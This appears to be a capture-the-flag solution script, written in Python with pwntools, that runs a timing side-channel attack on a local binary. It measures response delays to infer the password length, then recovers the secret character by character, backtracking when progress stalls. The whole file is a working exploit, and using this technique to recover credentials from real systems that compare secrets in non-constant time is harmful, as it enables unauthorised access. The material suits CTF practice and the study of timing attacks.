from pwn import *
import datetime

context.binary = "./target/release/_10_ms_worth_of_sides"
p = process()

largest = datetime.timedelta()
pass_len = 0


def get_pw_len():
    global largest, pass_len
    largest = datetime.timedelta()
    pass_len = 0
    for i in range(1, 100):
        x = b"0" * i
        t = datetime.datetime.now()
        p.sendline(x)
        p.recvline()
        d = datetime.datetime.now() - t
        if d > largest:
            largest = d
            pass_len = i


get_pw_len()

print(f"Largest: {largest.microseconds}ms\nlen: {pass_len}")

known = ""
unknown = "*" * pass_len
i = len(known) + 1

fail_c = 0
i_changed = False
while True:
    # Reset state after 3 failed loops across character set
    if fail_c >= 3:
        i = len(known)
        known = known[:-1]
        unknown = "*" * pass_len
        fail_c = 0
        i_changed = False

    for c in "abcdefghijklmnopqrstuvwxyz0123456789{}_":
        key = known + c + unknown[i:]
        try:
            t = datetime.datetime.now()
            p.sendline(key)
            p.recvline()
            d = datetime.datetime.now() - t
        except EOFError:
            exit(0)
        print(f"{key} {d.microseconds} ({d.microseconds / largest.microseconds})")
        if d.microseconds / largest.microseconds > 1.01:
            known += c
            largest = d
            i += 1

            i_changed = True
            fail_c = 0
            break

    if not i_changed:
        fail_c += 1
    else:
        i_changed = False
